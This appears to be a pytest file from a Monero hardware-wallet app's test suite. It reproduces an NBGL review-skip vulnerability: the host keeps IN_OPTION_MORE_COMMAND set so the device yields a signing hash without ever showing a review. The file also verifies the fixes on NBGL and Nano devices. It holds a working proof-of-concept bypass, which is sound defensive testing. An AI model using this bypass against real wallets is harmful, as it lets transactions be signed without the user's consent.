"""
NBGL final review can be skipped entirely.

On NBGL (Stax/Flex) the only blocking review is start_signature() ->
nbgl_useCaseReview in monero_ux_nbgl.c, reached only from
ui_menu_validation_display_last / ui_menu_change_validation_display_last, which
monero_prehash.c calls only when (options & IN_OPTION_MORE_COMMAND) == 0. If the
host keeps IN_OPTION_MORE_COMMAND set, the device takes the
ui_menu_validation_display path, which on NBGL just accumulates the output and
auto-confirms with SW_OK and no UI.

IN_OPTION_MORE_COMMAND is host-controlled, and nothing records that a terminal
review happened: the signing gate only checks tx_sig_mode, and dispatch only
requires tx_state_p1 == 3 (prehash finalized), not user approval. So a host that
keeps the flag set on every output gets a full pre-MLSAG hash (mlsagH) for a
recipient set the user never saw.

TestNbglReviewSkippedVuln drives a full REAL churn (like test_sig_real_simple) with
is_last=False on every prehash update, does no review navigation, asserts the
review is never shown, and shows the device still returns mlsagH.
  * vulnerable build -> passes (no review, hash produced)
  * fixed build      -> device must refuse to finalize/sign without a review; this
    class then fails and is superseded by TestNbglReviewEnforced below.

BAGL (Nano) shows a Sign/Reject step for every output regardless of the flag, so
the skip isn't possible there and the test skips itself on Nano.

Run:  pytest tests/test_vuln_nbgl_review_skip.py -v --device flex
      (requires a DEBUG=1 build: BYPASS_COMMITMENT_FOR_TESTS + IODUMMYCRYPT)
"""

import struct
import threading
import time

import pytest

from ragger.backend.interface import BackendInterface
from ragger.error import ExceptionRAPDU
from ragger.navigator import Navigator

from monero_client.monero_types import SigType, Keys, Type, InsType
from monero_client.monero_cmd import MoneroCmd, PROTOCOL_VERSION
from monero_client.monero_crypto_cmd import MoneroCryptoCmd
from monero_client.crypto.hmac import hmac_sha256
from monero_client.utils.tx_prefix import build_tx_prefix_outkeys
from monero_client.utils.varint import encode_varint

# SW returned by the app-side approval gate when signing material is requested for
# a transaction the user never confirmed on screen.
SW_SECURITY_USER_NOT_APPROVED = 0x691D
# SW the app's IO gate (send_error_and_kill_app) answers when a command arrives
# while a confirmation is on screen; the app then exits to the dashboard (fail-closed).
SW_COMMAND_NOT_ALLOWED = 0x6980


def _raw_apdu(ins: InsType, p1: int, p2: int, option: int, payload: bytes) -> bytes:
    """Full APDU bytes in the app's framing (option is the first data byte)."""
    return struct.pack("BBBBBB", PROTOCOL_VERSION, ins.value, p1, p2,
                       1 + len(payload), option) + payload


def _output_payload(recv: Keys, ak: bytes, blinded_mask: bytes, blinded_amount: bytes,
                    is_change: bool) -> bytes:
    """An INS_VALIDATE output record, as an honest host streams per destination."""
    return b"".join((
        b"\x00", b"\x01" if is_change else b"\x00",
        recv.public_view_key, recv.public_spend_key, ak,
        hmac_sha256(ak, MoneroCryptoCmd.HMAC_KEY, Type.AMOUNT_KEY),
        bytes(32), blinded_mask, blinded_amount,
    ))


def _send_during_review(backend: BackendInterface, apdu: bytes,
                        review_marker: str = None, timeout: float = 8.0):
    """Send `apdu` while a review is pending, in a daemon thread, and observe the
    device. Returns ``(sw, processed)``:

      * ``(sw, False)``: the device ANSWERED (a fixed build's gate replies 0x6980
        and then exits to the dashboard).
      * ``(None, True)``: the exchange blocked AND ``review_marker`` is gone from
        screen — a vulnerable build dispatched the APDU and moved on to the
        injected output's own deferred review; caller must FAIL.
      * ``(None, False)``: blocked with the review still on screen — speculos
        serialized the concurrent APDU and never delivered it; caller should SKIP.
    """
    result: dict = {}

    def _run():
        try:
            result["sw"] = backend.exchange_raw(apdu).status
        except ExceptionRAPDU as exc:
            result["sw"] = exc.status
        except Exception as exc:
            result["error"] = repr(exc)

    th = threading.Thread(target=_run, daemon=True)
    th.start()
    th.join(timeout=timeout)
    if not th.is_alive():
        if "error" in result:
            raise AssertionError(f"transport error: {result['error']}")
        return (result.get("sw"), False)
    processed = review_marker is not None and not backend.compare_screen_with_text(review_marker)
    return (None, processed)


_NOT_DELIVERED_SKIP = ("the concurrent APDU was not delivered to the device — the ragger speculos "
                       "client serialized it behind the pending review's deferred reply. This "
                       "happens with ragger < 1.45.2; use ragger >= 1.45.2 (pinned in "
                       "tests/requirements.txt) so the 0x6980 rejection can be verified.")

# Title shown on the FIRST page of the real review flow
# (start_signature -> nbgl_useCaseReview, finishTitle "Sign transaction?" is only
# reached after swiping to the last page). A fixed build would park here on entry;
# the auto-confirm path never shows it, only the "Processing TX" spinner.
REVIEW_ONLY_TEXT = "Review Transaction"

ZERO_COMMITMENT = bytes.fromhex(32 * "00")


@pytest.mark.skip(reason="Demonstrates the (now-fixed) review-skip; passes only on a "
                         "build WITHOUT the user_approved_tx gate. Remove this skip to re-confirm "
                         "the exploit against a vulnerable build.")
@pytest.mark.incremental
class TestNbglReviewSkippedVuln:
    """End-to-end demonstration that an NBGL device finalizes a REAL transaction
    (yielding the pre-MLSAG signing hash) without ever showing the user a review,
    purely because the host kept IN_OPTION_MORE_COMMAND set on every output."""

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        # 2 outputs: destination (shown in the honest flow) + change (amount 0).
        return {
            "sender": None,
            "receiver_number": 2,
            "receiver": [None, None],
            "is_change_addr": [False, True],
            "is_subaddress": [False, False],
            "amount": [907880000, 0],  # 0.00090788 XMR destination, 0 change
            "tx_pub_key": None,
            "_tx_priv_key": None,
            "_ak_amount": [[], []],
            "blinded_amount": [[], []],
            "blinded_mask": [[], []],
            "y": [[], []],
            "eph_keys": [],
        }

    # ------------------------------------------------------------------ setup
    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def nbgl_only(device):
        # This is NBGL-specific: BAGL shows a Sign/Reject step for every output
        # regardless of IN_OPTION_MORE_COMMAND, so the review cannot be skipped.
        if device.is_nano:
            pytest.skip("NBGL-only vulnerability (Stax/Flex)")

    @staticmethod
    def test_reset(monero: MoneroCmd):
        monero.reset_and_get_version(monero_client_version=b"0.18")

    @staticmethod
    def test_get_keys(monero: MoneroCmd, state):
        public_view_key, public_spend_key, base58_address = monero.get_public_keys()
        sender = Keys(
            public_view_key=public_view_key,
            public_spend_key=public_spend_key,
            secret_view_key=None,
            secret_spend_key=None,
            addr=base58_address,
        )
        state["sender"] = sender
        state["receiver"][0] = sender  # churn to self
        state["receiver"][1] = sender

    @staticmethod
    def test_set_sig_real(monero: MoneroCmd):
        assert monero.set_signature_mode(sig_type=SigType.REAL) == SigType.REAL

    @staticmethod
    def test_open_tx(monero: MoneroCmd, state):
        tx_pub_key, _tx_priv_key, fake_view_key, fake_spend_key = monero.open_tx()
        assert fake_view_key == b"\x00" * 32
        assert fake_spend_key == b"\xff" * 32
        state["tx_pub_key"] = tx_pub_key
        state["_tx_priv_key"] = _tx_priv_key

    @staticmethod
    def test_gen_txout_keys(monero: MoneroCmd, state):
        for index in range(state["receiver_number"]):
            _ak_amount, out_ephemeral_pub_key, _ = monero.gen_txout_keys(
                _tx_priv_key=state["_tx_priv_key"],
                tx_pub_key=state["tx_pub_key"],
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                output_index=index,
                is_change_addr=state["is_change_addr"][index],
                is_subaddress=False,
            )
            state["_ak_amount"][index].append(_ak_amount)
            state["eph_keys"].append(out_ephemeral_pub_key)

    @staticmethod
    def test_prefix_hash(monero: MoneroCmd, navigator: Navigator, device, test_name: str, state):
        # Honest prefix carrying the device-derived one-time keys (output-key binding).
        assert len(state["eph_keys"]) == state["receiver_number"]
        prefix = build_tx_prefix_outkeys(vout_keys=state["eph_keys"], tx_pubkey=state["tx_pub_key"])
        monero.prefix_hash_init(test_name, device, navigator=navigator, version=0, timelock=0)
        monero.prefix_hash_update(index=1, payload=prefix, is_last=True)

    @staticmethod
    def test_gen_commitment_mask(monero: MoneroCmd, state):
        for index in range(state["receiver_number"]):
            s = monero.gen_commitment_mask(state["_ak_amount"][index][0])
            state["y"][index].append(s)

    @staticmethod
    def test_blind(monero: MoneroCmd, state):
        for index in range(state["receiver_number"]):
            blinded_mask, blinded_amount = monero.blind(
                _ak_amount=state["_ak_amount"][index][0],
                mask=state["y"][index][0],
                amount=state["amount"][index],
                is_short=True,
            )
            state["blinded_mask"][index].append(blinded_mask)
            state["blinded_amount"][index].append(blinded_amount)

    # ------------------------------------------------------------- the attack
    @staticmethod
    def test_validate_without_review(monero: MoneroCmd,
                                     backend: BackendInterface,
                                     navigator: Navigator,
                                     test_name,
                                     state):
        """Validate every output with IN_OPTION_MORE_COMMAND set (is_last=False)
        the WHOLE time, so the NBGL review screen is never reached, then finalize
        and obtain the pre-MLSAG signing hash. No review is ever navigated."""
        device = backend.device
        fee: int = 30660000  # 0.00003066 XMR

        # Fee: already auto-confirmed on NBGL (no UI) -> shows the spinner.
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, fee)

        # MALICIOUS: keep MORE set on every output. The honest flow would clear it
        # on the final output (is_last=True) to trigger start_signature(); we never do.
        for index in range(state["receiver_number"]):
            monero.validate_prehash_update(
                backend,
                test_name,
                navigator,
                index=index + 1,
                is_short=True,
                is_change_addr=state["is_change_addr"][index],
                is_subaddress=False,
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                _ak_amount=state["_ak_amount"][index][0],
                commitment=ZERO_COMMITMENT,
                blinded_amount=state["blinded_amount"][index][0],
                blinded_mask=state["blinded_mask"][index][0],
                is_last=False,  # <-- attack: IN_OPTION_MORE_COMMAND stays set
            )

        # At this exact point the honest flow is blocked on the "Sign transaction?"
        # review. Here the device has already auto-confirmed every output and is
        # sitting on the processing spinner. Prove the review never appeared.
        # Primary, wording-independent gate: a fixed build would be parked on the
        # review awaiting confirmation, so "Processing" would never appear here and
        # this would time out.
        backend.wait_for_text_on_screen("Processing")
        # Defense in depth: the review title must not be on screen. Speculos only --
        # a physical device retains display/app state across separate pytest runs,
        # so this negative check can match stale "Review Transaction" text left by a
        # previous test. On hardware the structural proof below (a 32-byte mlsagH
        # produced with no review navigation) is what demonstrates the skip.
        if type(backend).__name__ == "SpeculosBackend":
            assert not backend.compare_screen_with_text(REVIEW_ONLY_TEXT), (
                "review-skip not reproduced: the review screen was shown — the device did not "
                "auto-confirm. Is this a fixed build?"
            )

        # Finalize: the device still computes & returns the 32-byte pre-MLSAG hash
        # (validate_prehash_finalize asserts len(response)==32 on the last call).
        # That hash is exactly what INS_MLSAG/INS_CLSAG P1=3 sign — produced here
        # for a recipient set the user never reviewed.
        for index in range(state["receiver_number"]):
            is_last = index == (state["receiver_number"] - 1)
            monero.validate_prehash_finalize(
                index=index + 1,
                is_short=False,
                is_change_addr=False,
                is_subaddress=False,
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                _ak_amount=state["_ak_amount"][index][0],
                commitment=ZERO_COMMITMENT,
                blinded_amount=state["blinded_amount"][index][0],
                blinded_mask=state["blinded_mask"][index][0],
                is_last=is_last,
            )

        print(
            "\n[confirmed] NBGL device finalized a REAL transaction and produced "
            "the pre-MLSAG signing hash with NO user review:\n"
            "  - IN_OPTION_MORE_COMMAND was set on every output (is_last=False)\n"
            "  - start_signature()/nbgl_useCaseReview was never reached\n"
            "  - no Sign/Reject confirmation was navigated\n"
            "  - INS_VALIDATE/P1=3 returned a 32-byte mlsagH ready for MLSAG/CLSAG signing"
        )

    @staticmethod
    def test_close_tx(monero: MoneroCmd):
        monero.close_tx()


@pytest.mark.incremental
class TestNbglReviewEnforced:
    """Fix verification for (a): the app-side ``user_approved_tx`` gate.

    The flag is set ONLY in the review confirm callback (ui_menu_validation_action)
    and checked in monero_apdu_mlsag_prehash_finalize before the pre-MLSAG hash is
    produced (and again in monero_apdu_mlsag_sign / monero_apdu_clsag_sign). Driving
    the exact (a) attack — IN_OPTION_MORE_COMMAND set on every output so the review
    is never shown — must therefore be rejected at the terminal finalize with
    SW_SECURITY_USER_NOT_APPROVED (0x691D) instead of returning a 32-byte mlsagH.

    Verified passing against a build carrying the fix; the honest review->sign path
    is unaffected (see tests/test_sig_real_simple.py)."""

    _V = TestNbglReviewSkippedVuln

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def nbgl_only(device):
        if device.is_nano:
            pytest.skip("NBGL-only vulnerability (Stax/Flex)")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {
            "sender": None, "receiver_number": 2, "receiver": [None, None],
            "is_change_addr": [False, True], "is_subaddress": [False, False],
            "amount": [907880000, 0], "tx_pub_key": None, "_tx_priv_key": None,
            "_ak_amount": [[], []], "blinded_amount": [[], []],
            "blinded_mask": [[], []], "y": [[], []], "eph_keys": [],
        }

    @staticmethod
    def test_setup(monero: MoneroCmd, navigator: Navigator, device, test_name: str, state):
        V = TestNbglReviewEnforced._V
        V.test_reset(monero)
        V.test_get_keys(monero, state)
        V.test_set_sig_real(monero)
        V.test_open_tx(monero, state)
        V.test_gen_txout_keys(monero, state)
        V.test_prefix_hash(monero, navigator, device, test_name, state)
        V.test_gen_commitment_mask(monero, state)
        V.test_blind(monero, state)

    @staticmethod
    def test_finalize_rejected_without_review(monero: MoneroCmd, backend: BackendInterface,
                                              navigator: Navigator, test_name, state):
        device = backend.device
        # Same (a) attack: keep IN_OPTION_MORE_COMMAND set on every output -> no review.
        monero.validate_prehash_init(test_name, device, navigator, 1, 0, 30660000)
        for index in range(state["receiver_number"]):
            monero.validate_prehash_update(
                backend, test_name, navigator, index=index + 1, is_short=True,
                is_change_addr=state["is_change_addr"][index], is_subaddress=False,
                dst_pub_view_key=state["receiver"][index].public_view_key,
                dst_pub_spend_key=state["receiver"][index].public_spend_key,
                _ak_amount=state["_ak_amount"][index][0], commitment=ZERO_COMMITMENT,
                blinded_amount=state["blinded_amount"][index][0],
                blinded_mask=state["blinded_mask"][index][0], is_last=False)

        backend.wait_for_text_on_screen("Processing")

        # The non-terminal finalize (MORE set) just accumulates -> still accepted.
        monero.validate_prehash_finalize(
            index=1, is_short=False, is_change_addr=False, is_subaddress=False,
            dst_pub_view_key=state["receiver"][0].public_view_key,
            dst_pub_spend_key=state["receiver"][0].public_spend_key,
            _ak_amount=state["_ak_amount"][0][0], commitment=ZERO_COMMITMENT,
            blinded_amount=state["blinded_amount"][0][0],
            blinded_mask=state["blinded_mask"][0][0], is_last=False)

        # The terminal finalize (MORE clear) would produce the pre-MLSAG hash. With
        # the gate, the device refuses because the user never approved any review.
        with pytest.raises(ExceptionRAPDU) as exc_info:
            monero.validate_prehash_finalize(
                index=2, is_short=False, is_change_addr=False, is_subaddress=False,
                dst_pub_view_key=state["receiver"][1].public_view_key,
                dst_pub_spend_key=state["receiver"][1].public_spend_key,
                _ak_amount=state["_ak_amount"][1][0], commitment=ZERO_COMMITMENT,
                blinded_amount=state["blinded_amount"][1][0],
                blinded_mask=state["blinded_mask"][1][0], is_last=True)
        assert exc_info.value.status == SW_SECURITY_USER_NOT_APPROVED, (
            f"expected SW_SECURITY_USER_NOT_APPROVED ({SW_SECURITY_USER_NOT_APPROVED:#06x}) "
            f"for an unreviewed tx, got {exc_info.value.status:#06x}"
        )
        print(f"\n[FIXED] device refused to finalize an unreviewed transaction "
              f"with {SW_SECURITY_USER_NOT_APPROVED:#06x} — no signing material produced.")


@pytest.mark.incremental
class TestNanoReviewCannotBeSkipped:
    """(a) on BAGL (Nano S+ / Nano X): the NBGL review-skip attack cannot exist.

    The NBGL (a) vuln relies on NBGL silently auto-confirming non-final outputs
    (IN_OPTION_MORE_COMMAND), so a host can accumulate every output without a
    review and then finalize. BAGL has NO silent auto-confirm: every fee/output is
    shown in its own *blocking* review, and the app defers its reply until the
    user acts. The unified IO-layer gate then refuses any APDU that arrives while a
    reply is owed, so a host cannot advance the signing flow past an unacknowledged
    review — the 'skip all reviews' attack can't even begin.

    This test holds the device on the fee review and shows the very next signing
    step (an output) is rejected with 0x6980, after which the app exits
    (fail-closed). (The app-side user_approved_tx gate, verified for NBGL in
    TestNbglReviewEnforced, is belt-and-suspenders here since the IO gate already
    blocks reaching finalize unreviewed.)

    Hardware cleanup: the injection makes the app exit, so the device returns to
    the dashboard on its own — no manual Reject needed. Invisible on speculos
    (torn down per class)."""

    _V = TestNbglReviewSkippedVuln

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def nano_only(device):
        if not device.is_nano:
            pytest.skip("BAGL-only (Nano S+/X); NBGL is covered by TestNbglReviewEnforced")

    @staticmethod
    @pytest.fixture(autouse=True, scope="class")
    def state():
        return {
            "sender": None, "receiver_number": 2, "receiver": [None, None],
            "is_change_addr": [False, True], "is_subaddress": [False, False],
            "amount": [907880000, 0], "tx_pub_key": None, "_tx_priv_key": None,
            "_ak_amount": [[], []], "blinded_amount": [[], []],
            "blinded_mask": [[], []], "y": [[], []], "eph_keys": [],
        }

    @staticmethod
    def test_setup(monero: MoneroCmd, navigator: Navigator, device, test_name: str, state):
        V = TestNanoReviewCannotBeSkipped._V
        V.test_reset(monero)
        V.test_get_keys(monero, state)
        V.test_set_sig_real(monero)
        V.test_open_tx(monero, state)
        V.test_gen_txout_keys(monero, state)
        V.test_prefix_hash(monero, navigator, device, test_name, state)
        V.test_gen_commitment_mask(monero, state)
        V.test_blind(monero, state)

    @staticmethod
    def test_cannot_advance_past_pending_review(monero: MoneroCmd, backend: BackendInterface,
                                                state):
        # Send the fee APDU write-only: on BAGL this draws the blocking fee review
        # and the app defers its reply (parked awaiting the user).
        fee_apdu = _raw_apdu(InsType.INS_VALIDATE, p1=1, p2=1, option=0x00,
                             payload=b"\x00" + encode_varint(30660000))
        backend.send_raw(fee_apdu)
        time.sleep(1.0)
        assert backend.compare_screen_with_text("Fee"), "expected the fee review on screen"

        # Try to advance the signing flow (send the first output) WITHOUT
        # acknowledging the review — the BAGL equivalent of skipping reviews. The
        # IO gate must reject it: the host cannot reach finalize/mlsagH unreviewed.
        next_apdu = _raw_apdu(InsType.INS_VALIDATE, p1=2, p2=1, option=0x80 | 0x02,
                              payload=_output_payload(state["receiver"][0], state["_ak_amount"][0][0],
                                                      state["blinded_mask"][0][0],
                                                      state["blinded_amount"][0][0], is_change=False))
        sw, processed = _send_during_review(backend, next_apdu, review_marker="Fee")
        if processed:
            pytest.fail("VULNERABLE: the host advanced past the unacknowledged fee review — "
                        "the injected output was processed and its review replaced the fee one.")
        if sw is None:
            pytest.skip(_NOT_DELIVERED_SKIP)
        assert sw == SW_COMMAND_NOT_ALLOWED, (
            f"expected the review to be mandatory (reject {SW_COMMAND_NOT_ALLOWED:#06x}), "
            f"got {sw:#06x}"
        )
        # 0x6980 is emitted only by send_error_and_kill_app, so it already means
        # "rejected and exited fail-closed". We can't probe the screen afterwards:
        # on speculos app_exit() tears the emulator down, on hardware it returns to
        # the dashboard.
        print("\n[FIXED on BAGL] the host cannot advance past an unacknowledged "
              f"review: the next signing step was rejected with {SW_COMMAND_NOT_ALLOWED:#06x} "
              "and the app exited.")
